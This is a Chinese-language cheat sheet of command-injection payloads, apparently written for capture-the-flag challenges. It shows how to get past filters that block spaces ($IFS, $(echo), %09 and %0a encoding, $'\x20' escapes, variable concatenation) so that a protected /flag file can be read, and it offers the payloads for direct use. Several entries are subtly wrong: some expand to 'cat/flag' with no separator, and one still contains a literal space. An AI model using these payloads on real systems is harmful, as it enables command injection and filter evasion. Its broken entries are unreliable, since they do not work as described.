# 🧠 空格绕过 Cheat Sheet

## 1. 经典环境变量绕过

```shell
#使用 `$IFS`（内部字段分隔符，默认是空格）
cat$IFS/flag
ls$IFS-la

#使用 `$IFS`直接赋值（如果`IFS`被修改，可以自己设定）（`%09` 是Tab字符）
IFS=%09;cat$IFS/flag
```



------

## 2. 子命令替换生成空格

```shell
#使用 `$(echo)`：（注意：`echo\ `就是`echo 后跟一个空格`）
cat$(echo)/flag
cat$(echo\ )/flag

#使用反引号 ``echo``：
cat`echo`/flag
cat`echo\ `/flag
```



------

## 3. URL编码绕过（Web场景）

```shell
#空格对应 `%20`
cat%20/flag

#有些WAF可能拦 `%20`，可以试试：
#- `%09` → tab制表符
#- `%0a` → 换行符
cat%09/flag
cat%0a/flag
```

------

## 4. 特殊字符绕过

```shell
#使用 Shell 支持的控制字符表示空格：
cat$'\x20'/flag
cat$'\x09'/flag   # Tab
cat$'\x0a'/flag   # 换行
```

其中 `$'\x20'` 是bash支持的**十六进制转义**。

------

## 5. Shell内置展开绕过

```shell
#使用数组或参数扩展
cmd="cat /flag"
${cmd}

#或者直接用拼接：
c=cat;f=/flag;$c$f
```

------

## 6. Bash Tricks



```shell
#如果能用 Bash 特性，还可以：不过这要求执行环境支持 Bash 特性。
cat<<<$(</flag)
<<< $(cat /flag)
```



------

# 🔥 经验总结

> **第一首选**是 `$IFS`。
>
> **第二优选**是 `$(echo\ )`。
>
> URL编码只适合**Web场景**。
>
> 如果系统环境很干净又很严，可以尝试**控制字符**（`$'\x20'`这种）。 